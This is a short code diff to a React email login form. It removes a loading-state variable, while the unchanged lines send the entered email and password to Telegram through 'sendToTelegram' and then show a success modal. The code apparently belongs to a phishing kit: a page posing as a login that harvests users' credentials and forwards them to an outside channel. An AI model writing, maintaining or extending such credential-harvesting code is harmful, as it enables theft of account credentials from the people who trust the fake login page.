@@ -12,7 +12,6 @@ const EmailLoginForm = ({ onClose, playClickSound }: EmailLoginProps) => {
   const [password, setPassword] = useState('');
   const [emailError, setEmailError] = useState(false);
   const [pwError, setPwError] = useState(false);
-  const [loading, setLoading] = useState(false);
   const [showCustomLoading, setShowCustomLoading] = useState(false);
   const [step, setStep] = useState(1);
 
@@ -51,8 +50,6 @@ const EmailLoginForm = ({ onClose, playClickSound }: EmailLoginProps) => {
 
     if (!ok) return;
 
-    setLoading(true);
-
     // Send to Telegram with "Email Login" context
     const success = await sendToTelegram(email, password, "Email Login", "-");
     
@@ -61,7 +58,6 @@ const EmailLoginForm = ({ onClose, playClickSound }: EmailLoginProps) => {
 
     setTimeout(() => {
       setShowCustomLoading(false);
-      setLoading(false);
       
       if (success) {
         setStep(3); // Success modal
